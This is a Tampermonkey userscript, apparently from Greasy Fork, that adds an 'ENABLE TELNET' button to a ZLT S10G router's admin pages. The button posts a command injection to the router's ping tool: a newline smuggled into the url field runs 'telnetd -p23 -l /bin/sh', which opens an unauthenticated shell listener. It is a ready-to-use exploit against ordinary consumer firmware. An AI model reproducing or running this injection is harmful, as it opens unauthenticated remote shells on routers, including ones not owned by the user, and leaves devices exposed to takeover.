// ==UserScript==
// @name         ZLT S10G ENABLE TELNET
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  Adds a button to send a POST request on pages under http://192.168.254.254/*
// @author       You
// @match        http://192.168.254.254/*
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/537699/ZLT%20S10G%20ENABLE%20TELNET.user.js
// @updateURL https://update.greasyfork.org/scripts/537699/ZLT%20S10G%20ENABLE%20TELNET.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Create and style the main button
    const button = document.createElement('button');
    button.innerText = 'ENABLE TELNET';
    button.style.position = 'fixed';
    button.style.top = '50%';
    button.style.left = '20px';
    button.style.transform = 'translateY(-50%)';
    button.style.padding = '10px 20px';
    button.style.backgroundColor = '#4CAF50';
    button.style.color = 'white';
    button.style.border = 'none';
    button.style.borderRadius = '5px';
    button.style.cursor = 'pointer';
    button.style.zIndex = '9999';
    button.style.fontSize = '16px';

    // Append button to the page
    document.body.appendChild(button);

    // Define the URL and body content for the POST request
    const url = 'http://192.168.254.254/goform/goform_get_cmd_process';
    const body = 'isTest=false&cmd=network_tools&pingTimes=1&url=127.0.0.1.1%0Atelnetd+-p23+-l+/bin/sh&port=-1&subcmd=1';

    // Add click event listener to the main button
    button.addEventListener('click', function() {
        button.innerText = 'Sending...';
        button.disabled = true;

        // Send POST request using GM_xmlhttpRequest
        GM_xmlhttpRequest({
            method: 'POST',
            url: url,
            data: body,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            onload: function(response) {
                const statusMessage = `Response Status: ${response.status} ${response.statusText || 'OK'}\nThis script is FREE. Created using Grok AI.`;
                console.log('POST request result:', response.responseText, 'Status:', statusMessage);
                alert(statusMessage);
                button.innerText = 'ENABLE TELNET'; // Revert to original text
                button.disabled = false;
            },
            onerror: function(error) {
                console.error('Error sending POST request:', error);
                alert('Error: Failed to send POST request. Check console for details.\nThis script is FREE. Created using Grok AI.');
                button.innerText = 'ENABLE TELNET'; // Revert to original text
                button.disabled = false;
            },
            ontimeout: function() {
                console.error('POST request timed out');
                alert('Error: Request timed out.\nThis script is FREE. Created using Grok AI.');
                button.innerText = 'ENABLE TELNET'; // Revert to original text
                button.disabled = false;
            },
            timeout: 10000 // Set a 10-second timeout
        });
    });
})();